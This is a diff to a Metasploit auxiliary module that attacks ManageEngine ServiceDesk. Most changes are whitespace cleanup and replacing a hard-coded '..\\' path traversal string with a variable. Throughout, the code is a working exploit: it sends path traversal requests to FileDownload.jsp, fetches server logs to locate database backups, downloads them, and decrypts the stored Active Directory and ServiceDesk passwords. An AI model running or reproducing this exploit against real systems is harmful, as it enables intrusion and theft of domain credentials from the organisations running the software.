@@ -16,7 +16,7 @@ require 'base64'
 class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::Report
-	
+
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'MnageEngine ServiceDesk database/AD account disclosure',
@@ -25,8 +25,8 @@ class Metasploit3 < Msf::Auxiliary
 					users to load files from remote server. The vulnerability allows
 					attackers to conduct path traversal attack and get contents of the
 					file located outside ServiceDesk web directory. Through this
-					vulnerability an attacker can download backup of system database 
-					that often contains Active Directory account.  Module decrypts AD 
+					vulnerability an attacker can download backup of system database
+					that often contains Active Directory account.  Module decrypts AD
 					account password (password is encrypted with reversible encryption).
 					Account is used to access Active Directory data for further usage
 					in ServiceDesk.
@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Auxiliary
 				return 1
 			elsif (ver[0] == 8 and ver[1] == 0 and ver[2] < 10 )
 				return 2
-			else 
+			else
 				is_vuln = unknown_version_check(datastore['INSTALL_PATH'])
 				if is_vuln == "your_are_not_ed_radical"
 					return 3
@@ -91,32 +91,32 @@ class Metasploit3 < Msf::Auxiliary
 	def get_install_path(user_dir)
 
 		check_dirs = ["ManageEngine\\ServiceDesk\\","ServiceDesk\\"]
-		if user_dir != '' 
-			check_dirs.push(user_dir) 
+		if user_dir != ''
+			check_dirs.push(user_dir)
 		end
-		
+
 		check_files = ["COPYRIGHT","logs\\configport.txt","bin\\run.bat","server\\default\\log\\boot.log"]
-		
+		path_traversal = "..\\" * 20
 		if datastore['URI'][-1, 1] == "/"
-			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
+			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=" + path_traversal
 		else
-			vuln_page = datastore['URI'] + "/workorder/FileDownload.jsp?module=agent\&path=./\&delete=false\&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
+			vuln_page = datastore['URI'] + "/workorder/FileDownload.jsp?module=agent\&path=./\&delete=false\&FILENAME=" + path_traversal
 		end
-	
+
 		bad_file_name_uri = vuln_page + Rex::Text.rand_text_alphanumeric(rand(1337)+1337) + ".exe"
-		
+
 		if File.exists?(Dir.tmpdir + "/bad_sd_file")
 			File.delete(Dir.tmpdir + "/bad_sd_file")
 		end
-		
+
 		res = send_request_raw({
 			'uri' => bad_file_name_uri
 		})
-	
-		n_file = File.open(Dir.tmpdir + '/bad_sd_file', 'w')
-		n_file.write res.body 
+
+		n_file = File.open(Dir.tmpdir + '/bad_sd_file', 'wb')
+		n_file.write res.body
 		n_file.close
-		
+
 		bad_sd_file_size = File.size(Dir.tmpdir + "/bad_sd_file")
 		File.delete(Dir.tmpdir + "/bad_sd_file")
 		print_status("Retriving install path.")
@@ -130,8 +130,8 @@ class Metasploit3 < Msf::Auxiliary
 				if File.exists?(Dir.tmpdir + "/tmp_sd_file")
 					File.delete(Dir.tmpdir + "/tmp_sd_file")
 				end
-				n_file = File.open(Dir.tmpdir + '/tmp_sd_file', 'w')
-				n_file.write res.body 
+				n_file = File.open(Dir.tmpdir + '/tmp_sd_file', 'wb')
+				n_file.write res.body
 				n_file.close
 				tmp_sd_file_size = File.size(Dir.tmpdir + "/tmp_sd_file")
 				if tmp_sd_file_size != bad_sd_file_size
@@ -141,7 +141,7 @@ class Metasploit3 < Msf::Auxiliary
 					File.delete(Dir.tmpdir + "/tmp_sd_file")
 				end
 			end
-			
+
 			if dir_is_ok == 4
 				print_status("You are lucky! ServiceDesk installed to '#{sdDir}' directory.")
 				return sdDir
@@ -155,38 +155,38 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		return 'your_are_not_ed_radical'
 	end
-	
+
 	def unknown_version_check(user_dir)
 		check_dirs = ["ManageEngine\\ServiceDesk\\","ServiceDesk\\"]
-		if user_dir != '' 
-			check_dirs.push(user_dir) 
+		if user_dir != ''
+			check_dirs.push(user_dir)
 		end
-		
+
 		check_files = ["COPYRIGHT","logs\\configport.txt","bin\\run.bat","server\\default\\log\\boot.log"]
-		
+		path_traversal = "..\\" * 20
 		if datastore['URI'][-1, 1] == "/"
-			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
+			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=" + path_traversal
 		else
-			vuln_page = datastore['URI'] + "/workorder/FileDownload.jsp?module=agent\&path=./\&delete=false\&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
+			vuln_page = datastore['URI'] + "/workorder/FileDownload.jsp?module=agent\&path=./\&delete=false\&FILENAME=" + path_traversal
 		end
-	
+
 		bad_file_name_uri = vuln_page + Rex::Text.rand_text_alphanumeric(rand(1337)+1337) + ".exe"
-		
+
 		if File.exists?(Dir.tmpdir + "/bad_sd_file")
 			File.delete(Dir.tmpdir + "/bad_sd_file")
 		end
-		
+
 		res = send_request_raw({
 			'uri' => bad_file_name_uri
 		})
-	
-		n_file = File.open(Dir.tmpdir + '/bad_sd_file', 'w')
-		n_file.write res.body 
+
+		n_file = File.open(Dir.tmpdir + '/bad_sd_file', 'wb')
+		n_file.write res.body
 		n_file.close
-		
+
 		bad_sd_file_size = File.size(Dir.tmpdir + "/bad_sd_file")
 		File.delete(Dir.tmpdir + "/bad_sd_file")
-		
+
 		check_dirs.each do |sdDir|
 			dir_is_ok = 0
 			check_files.each do |sdFile|
@@ -197,8 +197,8 @@ class Metasploit3 < Msf::Auxiliary
 				if File.exists?(Dir.tmpdir + "/tmp_sd_file")
 					File.delete(Dir.tmpdir + "/tmp_sd_file")
 				end
-				n_file = File.open(Dir.tmpdir + '/tmp_sd_file', 'w')
-				n_file.write res.body 
+				n_file = File.open(Dir.tmpdir + '/tmp_sd_file', 'wb')
+				n_file.write res.body
 				n_file.close
 				tmp_sd_file_size = File.size(Dir.tmpdir + "/tmp_sd_file")
 				if tmp_sd_file_size != bad_sd_file_size
@@ -208,7 +208,7 @@ class Metasploit3 < Msf::Auxiliary
 					File.delete(Dir.tmpdir + "/tmp_sd_file")
 				end
 			end
-			
+
 			if dir_is_ok == 4
 				return sdDir
 			elsif dir_is_ok >= 2
@@ -217,14 +217,15 @@ class Metasploit3 < Msf::Auxiliary
 				return sdDir
 			end
 		end
-	
+
 		return 'your_are_not_ed_radical'
 	end
-	
-	
-	
+
+
+
 	def get_server_out_logs(install_dir)
-		vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
+		path_traversal = "..\\" * 20
+		vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=" + path_traversal
 		bad_file_name_uri = vuln_page + install_dir + "server\\default\\log\\serverout_ed_radical.txt"
 		res = send_request_raw({
 			'uri' => bad_file_name_uri
@@ -232,19 +233,19 @@ class Metasploit3 < Msf::Auxiliary
 		if File.exists?(Dir.tmpdir + "/tmp_sd_file")
 			File.delete(Dir.tmpdir + "/tmp_sd_file")
 		end
-		n_file = File.open(Dir.tmpdir + '/tmp_sd_file', 'w')
-		n_file.write res.body 
+		n_file = File.open(Dir.tmpdir + '/tmp_sd_file', 'wb')
+		n_file.write res.body
 		n_file.close
 		bad_sd_file_size = File.size(Dir.tmpdir + "/tmp_sd_file")
 		if File.exists?(Dir.tmpdir + "/tmp_sd_file")
 			File.delete(Dir.tmpdir + "/tmp_sd_file")
 		end
-		
+
 		i = 0
 		while i <= 10 do
-			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
+			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=" + path_traversal
 			file_name_uri = vuln_page + install_dir + "server\\default\\log\\serverout#{i}.txt"
-			
+
 			res = send_request_raw({
 				'uri' => file_name_uri
 			})
@@ -252,15 +253,15 @@ class Metasploit3 < Msf::Auxiliary
 				File.delete(Dir.tmpdir + "/serverout#{i}.txt")
 			end
 
-			n_file = File.open(Dir.tmpdir + "/serverout#{i}.txt", 'w')
-			n_file.write res.body 
+			n_file = File.open(Dir.tmpdir + "/serverout#{i}.txt", 'wb')
+			n_file.write res.body
 			n_file.close
-		
+
 			sd_file_size = File.size(Dir.tmpdir + "/serverout#{i}.txt")
 			if sd_file_size == bad_sd_file_size
 				File.delete(Dir.tmpdir + "/serverout#{i}.txt")
 				return i
-			else 
+			else
 				print_status("We got 'server\\default\\log\\serverout#{i}.txt'.")
 			end
 			i += 1
@@ -272,9 +273,9 @@ class Metasploit3 < Msf::Auxiliary
 		i -= 1
 		while i >=0 do
 			if File.exists?(Dir.tmpdir + "/serverout#{i}.txt")
-				n_file = File.open(Dir.tmpdir + "/serverout#{i}.txt", 'r')
+				n_file = File.open(Dir.tmpdir + "/serverout#{i}.txt", 'rb')
 				while (line = n_file.gets)
-					if /\[(\d+):(\d+):(\d+):(\d+)\]\|\[(\d+)-(\d+)-(\d+)\]\|\[SYSOUT\](.*)BACKUPDIR=(.*), ATTACHMENT=(.*)/.match line 
+					if /\[(\d+):(\d+):(\d+):(\d+)\]\|\[(\d+)-(\d+)-(\d+)\]\|\[SYSOUT\](.*)BACKUPDIR=(.*), ATTACHMENT=(.*)/.match line
 						l = $10
 						end_of_file = $5 + "_"+ $6 +"_"+ $7 +"_"+ $1 +"_"+ $2 +".data"
 						if /false, DATABASE(.*)/.match $10
@@ -376,7 +377,7 @@ class Metasploit3 < Msf::Auxiliary
 				end
 				pos += 1
 			end
-			
+
 			if xpos.to_s == "00000"
 				if reminder != 0
 					tempo = reminder.to_s
@@ -428,7 +429,7 @@ class Metasploit3 < Msf::Auxiliary
 				answer << (xpos.to_i * 60 + reminder.to_i).to_s
 			else
 				isthere = 0
-				pos = 0 
+				pos = 0
 				while isthere == 0
 					xalpha = xstr[6*k..xstr.size]
 					if xalpha == base[pos]
@@ -454,37 +455,38 @@ class Metasploit3 < Msf::Auxiliary
 		fin = fin.reverse
 		return fin
 	end
-	
+
 	def get_accounts(file_name_uri)
+		path_traversal = "..\\" * 20
 		if datastore['URI'][-1, 1] == "/"
-			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
+			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=" + path_traversal
 		else
-			vuln_page = datastore['URI'] + "/workorder/FileDownload.jsp?module=agent\&path=./\&delete=false\&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
+			vuln_page = datastore['URI'] + "/workorder/FileDownload.jsp?module=agent\&path=./\&delete=false\&FILENAME=" + path_traversal
 		end
-	
+
 		bad_file_name_uri = vuln_page + Rex::Text.rand_text_alphanumeric(rand(1337)+1337) + ".exe"
-		
+
 		if File.exists?(Dir.tmpdir + "/bad_sd_file")
 			File.delete(Dir.tmpdir + "/bad_sd_file")
 		end
-		
+
 		res = send_request_raw({
 			'uri' => bad_file_name_uri
 		})
-	
-		n_file = File.open(Dir.tmpdir + '/bad_sd_file', 'w')
-		n_file.write res.body 
+
+		n_file = File.open(Dir.tmpdir + '/bad_sd_file', 'wb')
+		n_file.write res.body
 		n_file.close
-		
+
 		bad_sd_file_size = File.size(Dir.tmpdir + "/bad_sd_file")
 		File.delete(Dir.tmpdir + "/bad_sd_file")
-		
-		
+
+
 		domain_accs = Array.new
 		res = send_request_raw({
 			'uri' => file_name_uri
 		})
-		
+
 		if File.exists?(Dir.tmpdir + "/lastbackup.data")
 			File.delete(Dir.tmpdir + "/lastbackup.data")
 		end
@@ -522,7 +524,7 @@ class Metasploit3 < Msf::Auxiliary
 				d_l_i = Array.new
 				d_l_i = d_login_info.split("\n")
 				d_l_i.each do |line|
-					if /\((\d+),(.*)'(.*)', (\d+)\);/.match line		
+					if /\((\d+),(.*)'(.*)', (\d+)\);/.match line
 						domain_id = $1.to_i
 						login = $3
 						password_id = $4.to_i
@@ -530,7 +532,7 @@ class Metasploit3 < Msf::Auxiliary
 						domain_accs.push(follow_me)
 					end
 				end
-				
+
 				# servicedesk accounts here
 				accounts = Array.new
 				login_info = zipfile.read("aaalogin.sql")
@@ -559,7 +561,7 @@ class Metasploit3 < Msf::Auxiliary
 					end
 				end
 
-				full_accounts = Array.new		
+				full_accounts = Array.new
 				acc_pwd_info = zipfile.read("aaaaccpassword.sql")
 				a_p_i = Array.new
 				a_p_i = acc_pwd_info.split("\n")
@@ -592,8 +594,8 @@ class Metasploit3 < Msf::Auxiliary
 		else
 			print_status("Latest backup not found.")
 		end
-		
-		
+
+
 		if File.exists?(Dir.tmpdir + "/lastbackup.data")
 			File.delete(Dir.tmpdir + "/lastbackup.data")
 		end
@@ -604,24 +606,26 @@ class Metasploit3 < Msf::Auxiliary
 		is_ok = check
 		if is_ok == 1 or is_ok == 2
 			backup_dir = datastore['INSTALL_PATH']
-	
+
 			install_dir = get_install_path(backup_dir)
-			
-			if install_dir == 'your_are_not_ed_radical' 
+
+			if install_dir == 'your_are_not_ed_radical'
 				print_status("Install path not found. Try to play with 'INSTALL_PATH' variable.")
-			else 
+			else
 				i=get_server_out_logs(install_dir)
-				if i == 0 
+				if i == 0
 					print_status("No one of serverout logs found.")
-				else 
+				else
 					backups = Array.new
 					backups = parse_serverout_logs(i)
 					print_status("Downloading latest backup of ServiceDesk database.")
-					vuln_page = "http://" + datastore['RHOST'] + ":" + datastore['RPORT'] + datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\" + install_dir + datastore['BACKUP_DIR']
+					path_traversal = "..\\" * 20
+					vuln_page = datastore['RHOST'] + ":" + datastore['RPORT'] + datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME="
+					vuln_page = "http://" + vuln_page + path_traversal + install_dir + datastore['BACKUP_DIR']
 					domain_accounts = Array.new
 					domain_accounts = get_accounts(vuln_page + backups.last)
 					if domain_accounts.size > 0
-						print_status("Active Directory accounts (DOMAIN\\USERNAME : PASSWORD) :")	
+						print_status("Active Directory accounts (DOMAIN\\USERNAME : PASSWORD) :")
 						domain_accounts.each do |acc|
 							tmp = Array.new
 							tmp = acc.split(" : ")
@@ -635,8 +639,11 @@ class Metasploit3 < Msf::Auxiliary
 							)
 							print_good(acc)
 						end
-					else 
-						print_status("Latest database does not contains any domain accouns.\n    You can download other backups by your self and check they out for\n    domain accounts in domaininfo, passwordinfo and domainlogininfo tables.\n    For more information, visit http://ptresearch.blogspot.com/2011/07/servicedesk-security-or-rate.html page.")
+					else
+						print_status("Latest database does not contains any domain accouns.\n\r\
+						You can download other backups by your self and check they out for\n\r\
+						domain accounts in domaininfo, passwordinfo and domainlogininfo tables.\n\r\
+						for more information, visit http://ptresearch.blogspot.com/2011/07/servicedesk-security-or-rate.html page.")
 					end
 					print_status("INFO :")
 					print_status("Also, you can download any backup using web browser :)")
